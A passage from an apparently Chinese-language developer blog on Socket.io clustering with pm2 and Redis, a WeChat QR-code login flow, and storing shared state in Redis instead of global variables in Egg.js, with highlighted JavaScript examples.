class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br></div></div><h4 id="pm2多进程共享数据"><a href="#pm2多进程共享数据" class="header-anchor">#</a> pm2多进程共享数据</h4> <p>利用 <code>socket.io-redis</code>结合redis处理。不能再使用 <code>global</code>存储；</p> <p><strong>没有放在gloal中,现在放在redis中,方便pm2多进程部署项目: (gloal跟redis的对比)</strong></p> <p>负责路由消息的接口就是我们所说的适配器。您可以在socket.io-adapter之上实现自己的继承（通过继承），也可以使用我们在Redis之上提供的实现：socket.io-redis：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> io <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'socket.io'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> redis <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'socket.io-redis'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
io<span class="token punctuation">.</span><span class="token function">adapter</span><span class="token punctuation">(</span><span class="token function">redis</span><span class="token punctuation">(</span><span class="token punctuation">{</span> host<span class="token operator">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">:</span> <span class="token number">6379</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><blockquote><p>集群后带来的主要问题就是异地服务器和多进程间的通讯问题，如果你的应用都是基于单进程颗粒的，则不需要考虑这个问题，如果你的信息在多进程则存在共享和通讯的问题，则集群后要小心处理。</p> <p>官方建议的方案是将数据（事件）集中存储（可以存储在内存或redis等持久化介质里），然后各服务端从集中存储的数据池里获取数据，其已经实现了一个抽象层 Socket.io-Adapter，这个抽象层使用内存，不建议直接使用，这里有人实现的redis的例子Socket.io-Redis（<a href="https://github.com/socketio/socket.io-adapter" target="_blank" rel="noopener noreferrer">地址<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>），坏处是你需要先安装redis。:</p> <p>上面说的都是socket进程间的通讯，如果你要从socket.io进程发消息给非socket.io进程，如http，则需要另外一个中间件socket.io-emitter（<a href="https://github.com/socketio/socket.io-emitter" target="_blank" rel="noopener noreferrer">地址<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>）。</p></blockquote> <h4 id="微信扫码登录实践"><a href="#微信扫码登录实践" class="header-anchor">#</a> 微信扫码登录实践</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> express <span class="token keyword">from</span> <span class="token string">'express'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> mongoose <span class="token keyword">from</span> <span class="token string">'mongoose'</span><span class="token punctuation">;</span>
mongoose<span class="token punctuation">.</span>Promise <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'bluebird'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> http <span class="token keyword">from</span> <span class="token string">'http'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> redisAdapter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'socket.io-redis'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> sport <span class="token operator">=</span> <span class="token number">3131</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_APP_INSTANCE</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> socketio <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'socket.io'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>sport<span class="token punctuation">)</span><span class="token punctuation">;</span>
socketio<span class="token punctuation">.</span><span class="token function">adapter</span><span class="token punctuation">(</span><span class="token function">redisAdapter</span><span class="token punctuation">(</span><span class="token punctuation">{</span>host<span class="token operator">:</span> config<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>host<span class="token punctuation">,</span> port<span class="token operator">:</span> config<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>port<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Cache<span class="token punctuation">.</span><span class="token function">delList</span><span class="token punctuation">(</span><span class="token string">'socketUser_*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Cache<span class="token punctuation">.</span><span class="token function">delList</span><span class="token punctuation">(</span><span class="token string">'userSocket_*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

global<span class="token punctuation">.</span>socketUser <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
global<span class="token punctuation">.</span>centralList <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
global<span class="token punctuation">.</span>io <span class="token operator">=</span> socketio<span class="token punctuation">;</span>

<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./config/socketio'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">default</span><span class="token punctuation">(</span>socketio<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">onDisconnect</span><span class="token punctuation">(</span><span class="token parameter">socket</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> socketId <span class="token operator">=</span> socket<span class="token punctuation">.</span>id<span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>socketUser<span class="token punctuation">[</span>socketId<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">delete</span> global<span class="token punctuation">.</span>socketUser<span class="token punctuation">[</span>socketId<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  Cache<span class="token punctuation">.</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">socketUser_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socketId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//使用；io.emit('hi', 'all sockets');</span>
<span class="token comment">//实践:用户扫描二维码登录功能；注意这里生成的二维码手机端要在加载解析&amp;处理,要不然直接获取有微信加的乱码问题；</span>
  socket<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'loginQR'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> socketId <span class="token operator">=</span> socket<span class="token punctuation">.</span>id<span class="token punctuation">;</span>
    <span class="token keyword">let</span> postTokenUrl <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>global<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">#/Mobile/MobileLogin?socketId=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socketId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&amp;b=onyx</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    QRCode<span class="token punctuation">.</span><span class="token function">toDataURL</span><span class="token punctuation">(</span>postTokenUrl<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">url</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">let</span> cacheData <span class="token operator">=</span> <span class="token punctuation">{</span>
        socketId<span class="token operator">:</span> socketId<span class="token punctuation">,</span>
        imageUrl<span class="token operator">:</span> url<span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      Cache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">loginQR_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socketId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> cacheData<span class="token punctuation">,</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//十分钟有效</span>
      socket<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'loginQRUrl'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// global.socketUser[socketId] = socket;</span>
      Cache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">socketUser_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socketId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//微信端登录扫描 ;登录扫描;微信端登录成功后请求，再发送token给web登录；</span>
<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">loginWechatScan</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> resData <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
  <span class="token keyword">let</span> token <span class="token operator">=</span> resData<span class="token punctuation">.</span>token<span class="token punctuation">;</span>
  <span class="token keyword">let</span> socketId <span class="token operator">=</span> resData<span class="token punctuation">.</span>socketId<span class="token punctuation">;</span>
  <span class="token keyword">return</span> Cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">loginQR_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>socketId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>socketId<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        global<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token function">to</span><span class="token punctuation">(</span>socketId<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'loginWechatScan'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>errorMsg<span class="token punctuation">.</span>qr_overdue_error<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>errorMsg<span class="token punctuation">.</span>qr_overdue_error<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token function">handleError</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br></div></div><h4 id="不稳定性优化"><a href="#不稳定性优化" class="header-anchor">#</a> 不稳定性优化</h4> <blockquote><p>由于socket.io相对于avpush推送没有那么稳定；要采取推送模式保证数据可以推送到设备上；</p></blockquote> <p>推拉模式并用保证数据推送的准确;</p> <p><strong>设备端要设置主动拉去数据;</strong>(结合bulll对队列推送,有后台ui保证数据准确送达)</p> <h4 id="用global跟redis存储的对比"><a href="#用global跟redis存储的对比" class="header-anchor">#</a> 用global跟redis存储的对比</h4> <p><strong>注意：</strong> 如果项目中同时使用了 <code>egg-redis</code>， 请单独配置，不可共用。<code>--sticky</code></p> <blockquote><p>egg中用global跟redis存储数据(map存储操作)的对比</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//app.js初始化</span>
<span class="token keyword">async</span> <span class="token function">didLoad</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// global.routeList = {}</span>
    <span class="token comment">// global.deviceList = {}</span>
    <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./lib/sys/udp'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>app<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">async</span> <span class="token function">beforeClose</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>app<span class="token punctuation">.</span>redis<span class="token punctuation">.</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>constant<span class="token punctuation">.</span>routeList<span class="token punctuation">)</span><span class="token comment">//删除全部</span>
    <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>app<span class="token punctuation">.</span>redis<span class="token punctuation">.</span><span class="token function">del</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>constant<span class="token punctuation">.</span>deviceList<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token comment">//设置（添加+删除）</span>
<span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> ctx <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">createAnonymousContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> route <span class="token operator">=</span> <span class="token keyword">await</span> ctx<span class="token punctuation">.</span>service<span class="token punctuation">.</span>route<span class="token punctuation">.</span><span class="token function">findOneAndCreate</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> app<span class="token punctuation">.</span>redis<span class="token punctuation">.</span><span class="token function">hset</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>constant<span class="token punctuation">.</span>routeList<span class="token punctuation">,</span> route<span class="token punctuation">.</span>host<span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//设置单个</span>
    <span class="token comment">// global.routeList[route.host] = {}</span>
    <span class="token keyword">await</span> ctx<span class="token punctuation">.</span>service<span class="token punctuation">.</span>route<span class="token punctuation">.</span><span class="token function">sendRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    app<span class="token punctuation">.</span>logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>udp<span class="token punctuation">.</span>portTcp<span class="token punctuation">,</span> host<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Tcp Connected : '</span> <span class="token operator">+</span> host<span class="token punctuation">)</span>
    <span class="token comment">// console.log('Tcp client : ', client)</span>
    <span class="token keyword">await</span> app<span class="token punctuation">.</span>redis<span class="token punctuation">.</span><span class="token function">hset</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>constant<span class="token punctuation">.</span>routeList<span class="token punctuation">,</span> host<span class="token punctuation">,</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//设置单个</span>
    <span class="token comment">// global.routeList[host] = client</span>
    <span class="token keyword">await</span> ctx<span class="token punctuation">.</span>service<span class="token punctuation">.</span>route<span class="token punctuation">.</span><span class="token function">sendRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token function">resolve</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
client<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">===== tcp connect </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> error</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> app<span class="token punctuation">.</span>redis<span class="token punctuation">.</span><span class="token function">hdel</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>constant<span class="token punctuation">.</span>routeList<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token comment">//删除单个</span>
    <span class="token comment">// delete global.routeList[host]</span>
    <span class="token keyword">await</span> ctx<span class="token punctuation">.</span>service<span class="token punctuation">.</span>route<span class="token punctuation">.</span><span class="token function">sendRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token function">reject</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">//获取(所有 + 单个)</span>
<span class="token keyword">const</span> hostClient <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span>redis<span class="token punctuation">.</span><span class="token function">hget</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>constant<span class="token punctuation">.</span>routeList<span class="token punctuation">,</span> host<span class="token punctuation">)</span><span class="token comment">//获取单个</span>
<span class="token comment">// const hostClient = global.routeList[host]</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>hostClient<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>hostClient<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">const</span> hosts <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span>redis<span class="token punctuation">.</span><span class="token function">hkeys</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>constant<span class="token punctuation">.</span>routeList<span class="token punctuation">)</span><span class="token comment">//获取所有</span>
<span class="token comment">// const hosts = Object.keys(global.routeList)</span>
<span class="token keyword">let</span> routes <span class="token operator">=</span> <span class="token keyword">await</span> ctx<span class="token punctuation">.</span>service<span class="token punctuation">.</span>route<span class="token punctuation">.</span><span class="token function">findAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> route <span class="token keyword">of</span> routes<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> status <span class="token operator">=</span> <span class="token number">2</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>hosts<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>route<span class="token punctuation">.</span>host<span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        status <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token punctuation">}</span>
    route<span class="token punctuation">.</span>status <span class="token operator">=</span> status
    <span class="token comment">// if (route.status !== status) {//数据库不做状态存储,默认是离线</span>
    <span class="token comment">//   route.status = status</span>
    <span class="token comment">//   await route.save()</span>
    <span class="token comment">// }</span>
<span class="token punctuation">}</span>
routes <span class="token operator">=</span> _<span class="token punctuation">.</span><span class="token function">orderBy</span><span class="token punctuation">(</span>routes<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'asc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'sRoutes'</span><span class="token punctuation">,</span> routes<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br></div></div><h3 id="_9-携带header或参数"><a href="#_9-携带header或参数" class="header-anchor">#</a> 9:携带header或参数</h3> <p>websocket协议在握手阶段借用了HTTP的协议，但是在JavaScript websocketAPI中并没有修改请求头的方法。</p> <p><code>var token='dcvuahsdnfajw12kjfasfsdf34'</code></p> <h4 id="send发送参数"><a href="#send发送参数" class="header-anchor">#</a> <strong>send发送参数</strong></h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span>  ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">&quot;ws://&quot;</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">&quot;/webSocketServer&quot;</span><span class="token punctuation">)</span><span class="token 